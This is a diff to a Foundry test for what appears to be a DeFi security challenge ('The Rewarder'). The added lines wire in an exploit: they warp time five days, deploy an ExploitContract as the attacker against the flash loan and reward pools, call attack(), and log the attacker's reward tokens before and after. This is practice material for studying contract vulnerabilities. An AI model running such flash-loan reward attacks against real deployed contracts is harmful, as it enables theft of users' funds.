@@ -9,6 +9,7 @@ import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPo
 import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
+import {ExploitContract} from "../../../src/Contracts/the-rewarder/ExploitContract.sol";
 
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
@@ -24,6 +25,8 @@ contract TheRewarder is Test {
     address payable internal bob;
     address payable internal charlie;
     address payable internal david;
+
+    ExploitContract internal exploiter;
 
     function setUp() public {
         utils = new Utilities();
@@ -88,6 +91,18 @@ contract TheRewarder is Test {
         /**
          * EXPLOIT START *
          */
+
+        console.log("Balance of Attacker in reward tokens before attack : ", theRewarderPool.rewardToken().balanceOf(attacker));
+
+
+        vm.warp(block.timestamp + 5 days); // 5 days, we jump so we can enter and then call distribute rewards
+
+        vm.startPrank(attacker);
+        ExploitContract exploit = new ExploitContract(address(flashLoanerPool), address(theRewarderPool), address(dvt), address(theRewarderPool.rewardToken()));
+        exploit.attack();
+        vm.stopPrank();
+
+        console.log("Balance of Attacker in reward tokens after attack : ", theRewarderPool.rewardToken().balanceOf(attacker));
 
         /**
          * EXPLOIT END *
